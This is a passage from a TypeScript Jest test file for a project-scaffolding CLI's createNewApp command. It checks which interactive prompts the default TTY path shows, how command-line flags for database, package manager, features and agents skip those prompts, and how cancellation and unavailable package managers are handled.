    await expect(createNewApp({ ...flags, pm: "" })).rejects.toThrow(
      ProcessExit,
    );

    expect(cancel).toHaveBeenCalledWith(
      expect.stringContaining("--pm flag requires"),
    );
    expect(setPackageManager).not.toHaveBeenCalled();
    expect(createWarlockApp).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
  });
});

describe("createNewApp — default TTY path", () => {
  /**
   * With a TTY present but neither `--yes` nor `--interactive`/`--customize`,
   * the default path asks for the preset and, unless the database is explicit,
   * its database. Every other answer comes from a flag or its default.
   */
  beforeEach(() => {
    hasInteractiveStdin.mockReturnValue(true);
  });

  it.each(["api", "web"] as const)(
    "asks the %s preset's database choice, including None",
    async stack => {
      select.mockResolvedValueOnce(stack).mockResolvedValueOnce("none");

      await createNewApp({ name: "default-app" });

      expect(text).not.toHaveBeenCalled();
      expect(select).toHaveBeenCalledTimes(2);
      expect(multiselect).not.toHaveBeenCalled();
      expect(confirm).not.toHaveBeenCalled();

      const databasePrompt = select.mock.calls[1][0] as {
        options: { value: string }[];
      };
      expect(databasePrompt.options.at(-1)?.value).toBe("none");
      expect(capturedApp().options.databaseDriver).toBe("none");
    },
  );

  it("prompts for the project name before the preset and database", async () => {
    text.mockResolvedValueOnce("typed-app");
    select.mockResolvedValueOnce("api").mockResolvedValueOnce("mongodb");

    await createNewApp({});

    expect(text).toHaveBeenCalledTimes(1);
    expect(select).toHaveBeenCalledTimes(2);
    expect(capturedApp().name).toBe("typed-app");
  });

  it('offers "Customize" as a third entry in the structural question', async () => {
    select.mockResolvedValueOnce("api").mockResolvedValueOnce("mongodb");

    await createNewApp({ name: "menu-app" });

    const options = (
      select.mock.calls[0][0] as { options: { value: string }[] }
    ).options;

    expect(options.map(option => option.value)).toEqual([
      "api",
      "web",
      "customize",
    ]);
  });

  it('picking "Customize" from the menu hands over to the full wizard without re-asking the name', async () => {
    text.mockResolvedValueOnce("menu-app");
    select
      .mockResolvedValueOnce("customize") // the structural question
      .mockResolvedValueOnce("yarn") // wizard: package manager
      .mockResolvedValueOnce("postgres"); // wizard: database driver
    multiselect
      .mockResolvedValueOnce(["test"]) // wizard: features
      .mockResolvedValueOnce(["openai"]) // wizard: ai providers
      .mockResolvedValueOnce(["claude"]); // wizard: agent-kit targets
    confirm
      .mockResolvedValueOnce(true) // wizard: git
      .mockResolvedValueOnce(true); // wizard: jwt

    await createNewApp({});

    // The name was asked ONCE, by the default path, and carried into the wizard.
    expect(text).toHaveBeenCalledTimes(1);

    const app = capturedApp();
    expect(app.name).toBe("menu-app");
    // Answers came from the wizard's prompts, not the non-interactive defaults:
    // mongodb/[]/false is what the default path would have produced.
    expect(app.options.databaseDriver).toBe("postgres");
    expect(app.options.features).toEqual(["test"]);
    expect(app.options.aiProviders).toEqual(["openai"]);
    expect(app.options.useGit).toBe(true);
    expect(app.options.useJWT).toBe(true);
  });

  it("bypasses the database prompt when --db is explicit", async () => {
    await createNewApp({
      name: "flagged-app",
      stack: "api",
      db: "postgres",
    });

    expect(text).not.toHaveBeenCalled();
    expect(select).not.toHaveBeenCalled();
    expect(multiselect).not.toHaveBeenCalled();
    expect(confirm).not.toHaveBeenCalled();
  });

  it.each([
    ["api", []],
    ["web", ["web"]],
  ] as const)(
    "uses PostgreSQL for the %s preset without changing its features",
    async (stack, features) => {
      select.mockResolvedValueOnce(stack).mockResolvedValueOnce("postgres");

      await createNewApp({ name: `${stack}-postgres` });

      const app = capturedApp();
      expect(app.options.databaseDriver).toBe("postgres");
      expect(app.options.databasePort).toBe(5432);
      expect(app.options.features).toEqual(features);
    },
  );

  it("honors explicit --db=none without showing the database prompt", async () => {
    await createNewApp({ name: "no-db", stack: "web", db: "none" });

    expect(select).not.toHaveBeenCalled();
    expect(capturedApp().options.databaseDriver).toBe("none");
  });

  it("does not scaffold when the preset database prompt is cancelled", async () => {
    select.mockResolvedValueOnce("api").mockResolvedValueOnce(CANCEL);

    await expect(createNewApp({ name: "cancel-db" })).rejects.toThrow(
      ProcessExit,
    );
    expect(cancel).toHaveBeenCalledWith("Database selection cancelled");
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("accepts every detected --pm value before default TTY scaffolding", async () => {
    getSystemPackageManagers.mockReturnValue(["npm", "yarn", "pnpm", "bun"]);

    for (const pm of ["npm", "yarn", "pnpm", "bun"]) {
      setPackageManager.mockClear();
      createWarlockApp.mockClear();

      await createNewApp({ name: "default-app", stack: "api", pm });

      expect(setPackageManager).toHaveBeenCalledWith(pm);
      expect(createWarlockApp).toHaveBeenCalledTimes(1);
    }
  });

  it("refuses an unavailable --pm before default TTY scaffolding begins", async () => {
    await expect(
      createNewApp({ name: "default-app", stack: "api", pm: "bun" }),
    ).rejects.toThrow(ProcessExit);

    expect(cancel).toHaveBeenCalledWith(
      expect.stringContaining('Package manager "bun"'),
    );
    expect(setPackageManager).not.toHaveBeenCalled();
    expect(createWarlockApp).not.toHaveBeenCalled();
  });

  it("includes the web feature by default when the structural answer is web", async () => {
    await createNewApp({ name: "web-app", stack: "web" });

    expect(capturedApp().options.features).toEqual(["web"]);
  });

  it("still honors an explicit --features over the stack's implicit default", async () => {
    await createNewApp({ name: "web-app", stack: "web", features: ["test"] });

    expect(capturedApp().options.features).toEqual(["test"]);
  });

  it("resolves the package manager, database, and agents from flags without prompting for them", async () => {
    await createNewApp({
      name: "flagged-app",
      stack: "api",
      pm: "pnpm",
      db: "postgres",
      agents: ["claude"],
    });

    expect(setPackageManager).toHaveBeenCalledWith("pnpm");
    const app = capturedApp();
    expect(app.options.databaseDriver).toBe("postgres");
    expect(app.options.agents).toEqual(["claude"]);
  });
});
